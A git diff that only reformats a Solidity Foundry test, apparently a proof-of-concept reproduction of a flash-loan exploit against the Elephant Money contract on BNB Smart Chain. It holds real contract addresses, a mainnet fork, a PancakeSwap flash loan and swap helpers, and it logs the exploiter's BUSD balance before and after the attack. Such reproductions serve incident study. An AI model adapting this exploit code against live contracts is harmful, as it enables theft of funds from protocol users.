@@ -18,25 +18,17 @@ interface IElephantStatus {
 }
 
 contract ContractTest is Test {
-    Uni_Pair_V3 private constant USDC_BUSD =
-        Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);
-    Uni_Pair_V3 private constant BUSDT_BUSD =
-        Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
-    Uni_Pair_V3 private constant WBNB_BUSD =
-        Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
-    Uni_Pair_V3 private constant BTCB_BUSD =
-        Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);
-    Uni_Router_V2 private constant PancakeRouter =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    IERC20 private constant BUSD =
-        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
-    IERC20 private constant WBNB =
-        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IElephantStatus private constant Elephant =
-        IElephantStatus(0x8Cf0A553aB3896e4832ebCC519a7A60828AB5740);
+    Uni_Pair_V3 private constant USDC_BUSD = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);
+    Uni_Pair_V3 private constant BUSDT_BUSD = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
+    Uni_Pair_V3 private constant WBNB_BUSD = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
+    Uni_Pair_V3 private constant BTCB_BUSD = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);
+    Uni_Router_V2 private constant PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IElephantStatus private constant Elephant = IElephantStatus(0x8Cf0A553aB3896e4832ebCC519a7A60828AB5740);
 
     function setUp() public {
-        vm.createSelectFork("bsc", 34114760);
+        vm.createSelectFork("bsc", 34_114_760);
         vm.label(address(USDC_BUSD), "USDC_BUSD");
         vm.label(address(BUSDT_BUSD), "BUSDT_BUSD");
         vm.label(address(WBNB_BUSD), "WBNB_BUSD");
@@ -49,9 +41,7 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Exploiter BUSD balance before attack",
-            BUSD.balanceOf(address(this)),
-            BUSD.decimals()
+            "Exploiter BUSD balance before attack", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
 
         USDC_BUSD.flash(
@@ -62,17 +52,11 @@ contract ContractTest is Test {
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BUSD balance after attack",
-            BUSD.balanceOf(address(this)),
-            BUSD.decimals()
+            "Exploiter BUSD balance after attack", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         uint8 num;
         uint256 amount;
         (num, amount) = abi.decode(data, (uint8, uint256));
@@ -112,13 +96,7 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(BUSD);
         path[1] = address(WBNB);
-        PancakeRouter.swapExactTokensForTokens(
-            BUSD.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        PancakeRouter.swapExactTokensForTokens(BUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp);
     }
 
     function WBNBToBUSD() internal {
@@ -126,11 +104,7 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(BUSD);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 }
